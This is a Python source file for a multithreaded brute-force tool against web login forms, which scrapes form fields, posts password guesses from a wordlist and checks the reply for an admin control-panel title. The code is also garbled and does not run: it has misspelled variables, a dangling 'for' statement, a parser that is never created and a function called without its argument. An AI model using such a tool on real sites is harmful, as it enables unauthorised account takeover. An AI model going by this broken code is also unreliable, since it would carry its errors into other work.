from urllib.request import *
import http.cookiejar as cookielib
import threading
import sys
from itertools import product
from queue import Queue
import argparse
from html.parser import HTMLParser

user_thread = 1
wordlist = None
list_of_words = []
username_field = None
password_field = ""
success_check = "Administration - Control Panel"
target_url = ""
target_post = ""
resume = None




class Bruter(object):
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False

    def run_bruteforce(self):

        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = cookielib.FileCookieJar("cookies")
            opener = build_opener(cookielib.HTTPCookieProcessor(jar))

            resposne = opener.open(target_url)

            page = response.read()

            print("Trying: %s : %s  (%d left)" %
                  (self.username, brute, self.password_q.qsize()))

            parser.BruteParser()
            parser.feed(page)

            post_tags = parser.tag_results

            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            login_data = urlencode(post_tags)
            login_response = opener.open(target_post, login_data)

            login_result = login_response.read()

            if success_check in login_result:
                self.found = True
                print("[*] Bruteforce Successful")
                print("[*] Username %s" % username)
                print("[*] Password %s" % password)
                print("[*] Waiting for other threads to finish...")
                return True
        
        for 



class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name, value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value

                if tag_name is not None:
                    self.tag_results[tag_name] = value

def build_wordlist(wordlist_file):
    fd = open(wordlist_file, "rb")
    raw_words = fd.readlines()
    fd.close()

    found_resume = False
    words = Queue()

    for word in raw_words:
        word = word.rstript()
        if resume is not None:
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_word = True
                    print("Resuming wordlist from: %s" % resume)
        else:
            words.put(word)
    return words

def main():
    global list_of_words
    if wordlist != None:
        list_of_words = build_wordlist()
        
    brute = Bruter(username_field, list_of_words)
    
    brute.run_bruteforce()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute-force authentication")
    parser.add_argument('target', help="Target URL to attempt brute force - contains the front-end HTML")
    parser.add_argument('target_post', help="Target POST request. This is the endpoint where login is called.")
    parser.add_argument('-w', '--wordlist', help="Adds a wordlist to use for bruteforce. If none selected, it will do a traditional brute force")
    parser.add_argument('-u', '--username', help="Enters to be used. If none selected, will brute force username as well.")
    parser.add_argument('-t', '--threads', type=int, help="Sets number of threads to use. Default = 1")
    args = parser.parse_args()
    
    if args.wordlist != None:
        wordlist = args.wordlist
    target_url = args.target
    target_post = args.target_post
    if args.threads != None and args.threads > 1:
        threads = args.threads
    if args.username != None:
        username_field = args.username
        
    main()
        

